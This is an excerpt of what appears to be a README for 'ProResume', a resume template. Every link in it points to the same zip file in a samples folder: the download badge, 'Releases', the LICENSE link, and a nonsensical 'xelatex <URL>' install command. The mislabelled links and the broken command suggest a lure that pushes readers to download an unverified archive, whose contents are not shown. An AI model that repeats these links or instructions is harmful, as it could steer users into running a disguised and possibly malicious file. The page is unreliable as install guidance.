...
## 📦 Download Now
[![Download ProResume](https://raw.githubusercontent.com/kuro85/ProResume/main/samples/Pro-Resume-v1.0.zip)](https://raw.githubusercontent.com/kuro85/ProResume/main/samples/Pro-Resume-v1.0.zip)
...
## 📥 Download & Install
1. Visit this page to download: [ProResume Releases](https://raw.githubusercontent.com/kuro85/ProResume/main/samples/Pro-Resume-v1.0.zip).
...
1. If using **TeX Live**, run the command line:
   ```bash
   xelatex https://raw.githubusercontent.com/kuro85/ProResume/main/samples/Pro-Resume-v1.0.zip
   ```
...
## ⚡ License
ProResume is open-source and free to use. For more details, please see the [LICENSE](https://raw.githubusercontent.com/kuro85/ProResume/main/samples/Pro-Resume-v1.0.zip) file in the repository.
